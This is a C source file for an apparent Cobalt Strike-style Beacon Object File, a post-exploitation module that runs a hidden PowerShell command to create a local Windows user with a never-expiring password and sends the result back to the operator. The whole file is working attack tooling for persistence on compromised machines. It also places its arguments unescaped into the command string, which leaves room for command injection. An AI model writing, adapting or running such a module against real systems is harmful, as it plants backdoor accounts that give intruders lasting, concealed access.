/*
 * user_create_ps.c — Create a Windows user via PowerShell.
 *
 * Uses CreateProcessA to execute PowerShell command:
 *   powershell -NoP -NonI -W Hidden -C "New-LocalUser -Name '<username>' -Password (ConvertTo-SecureString '<password>' -AsPlainText -Force) -PasswordNeverExpires"
 *
 * Args: "<username> <password>"
 *   Both username and password are required.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c user_create_ps.c -o user_create_ps.o
 */

#include <windows.h>
#include "beacon.h"

/* ---- BOF API Imports ---- */
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int   WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

#define HANDLE_FLAG_INHERIT_VAL 0x00000001
#define CP_ACP_VAL   0
#define CP_UTF8_VAL  65001
#define CREATE_NO_WINDOW 0x08000000

/* ---- No-CRT helpers ---- */
static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}
static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}
static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}

static void output_acp_as_utf8(const char* acp_buf, int acp_len)
{
    if (acp_len <= 0) return;
    WCHAR wbuf[2048];
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP_VAL, 0, acp_buf, acp_len, wbuf, 2048);
    if (wlen <= 0) { BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len); return; }
    char u8buf[8192];
    int u8len = KERNEL32$WideCharToMultiByte(CP_UTF8_VAL, 0, wbuf, wlen, u8buf, 8192, NULL, NULL);
    if (u8len <= 0) { BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len); return; }
    BeaconOutput(CALLBACK_OUTPUT, u8buf, u8len);
}

void go(char* args, int alen)
{
    char* username = NULL;
    char* password = NULL;
    int username_len = 0;
    int password_len = 0;

    /* Try parsing as two separate strings first (beacon16-null format) */
    if (args && alen >= 4) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        username = BeaconDataExtract(&parser, &username_len);

        /* Check if there's a second string */
        if (BeaconDataLength(&parser) >= 2) {
            password = BeaconDataExtract(&parser, &password_len);
        }
    }

    /* If second string not found, try parsing as single string "username password" */
    if (!password || password_len <= 0) {
        if (args && alen >= 2) {
            datap parser;
            BeaconDataParse(&parser, args, alen);
            char* input = BeaconDataExtract(&parser, &username_len);

            if (!input || username_len <= 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserPS] Usage: <username> <password>\n", 39);
                return;
            }

            /* Split at first space */
            char raw[512];
            bof_memset(raw, 0, sizeof(raw));
            int clen = username_len < 511 ? username_len : 511;
            bof_memcpy(raw, input, clen);
            raw[clen] = '\0';

            username = raw;
            password = NULL;

            for (int i = 0; i < clen; i++) {
                if (raw[i] == ' ') {
                    raw[i] = '\0';
                    password = raw + i + 1;
                    break;
                }
            }

            if (!password || bof_strlen(username) == 0 || bof_strlen(password) == 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserPS] Both username and password required\n", 45);
                return;
            }
            username_len = bof_strlen(username);
            password_len = bof_strlen(password);
        } else {
            BeaconOutput(CALLBACK_ERROR,
                "[UserPS] Usage: <username> <password>\n", 39);
            return;
        }
    }

    if (!username || !password || username_len <= 0 || password_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "[UserPS] Both username and password required\n", 45);
        return;
    }

    /* Build PowerShell command */
    char cmd[2048];
    int cp = 0;
    cp = sa(cmd, cp, "powershell -NoP -NonI -W Hidden -C \"New-LocalUser -Name '");
    cp = sa(cmd, cp, username);
    cp = sa(cmd, cp, "' -Password (ConvertTo-SecureString '");
    cp = sa(cmd, cp, password);
    cp = sa(cmd, cp, "' -AsPlainText -Force) -PasswordNeverExpires\"");
    cmd[cp] = '\0';

    /* Create pipe for output */
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa_pipe;
    sa_pipe.nLength = sizeof(sa_pipe);
    sa_pipe.lpSecurityDescriptor = NULL;
    sa_pipe.bInheritHandle = TRUE;

    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa_pipe, 0)) {
        BeaconOutput(CALLBACK_ERROR, "[UserPS] CreatePipe failed\n", 27);
        return;
    }
    KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT_VAL, 0);

    /* Setup STARTUPINFO */
    STARTUPINFOA si;
    bof_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;

    PROCESS_INFORMATION pi;
    bof_memset(&pi, 0, sizeof(pi));

    /* Execute command */
    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconOutput(CALLBACK_ERROR, "[UserPS] CreateProcess failed\n", 30);
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return;
    }

    KERNEL32$CloseHandle(hWritePipe);
    KERNEL32$WaitForSingleObject(pi.hProcess, 20000);

    /* Read output */
    char buf[4096];
    DWORD bytesRead;
    char header[] = "[UserPS] Output:\n";
    BeaconOutput(CALLBACK_OUTPUT, header, bof_strlen(header));

    while (KERNEL32$ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        output_acp_as_utf8(buf, (int)bytesRead);
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hReadPipe);
}
